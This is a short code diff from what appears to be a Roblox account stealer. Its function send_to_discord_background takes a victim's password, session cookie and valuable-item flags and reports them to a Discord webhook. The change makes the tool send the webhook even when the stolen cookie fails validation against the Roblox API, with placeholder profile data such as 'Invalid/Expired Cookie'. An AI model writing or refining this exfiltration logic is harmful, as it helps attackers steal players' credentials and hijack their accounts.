@@ -109,8 +109,17 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
         
         # Check if cookie actually works with Roblox API
         if not user_info.get('success', False):
-            print("Background: Cookie failed validation against Roblox API - not sending webhooks")
-            return
+            print("Background: Cookie failed validation against Roblox API - sending webhook with error info")
+            # Still send webhook but with failed cookie info
+            user_info = {
+                'success': False,
+                'username': 'Invalid/Expired Cookie',
+                'display_name': 'Invalid/Expired Cookie',
+                'user_id': None,
+                'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
+                'robux_balance': 'Cookie Invalid',
+                'premium_status': '❌ No'
+            }
         
         # Check if user has Korblox or Headless for ping notification
         has_premium_items = korblox or headless
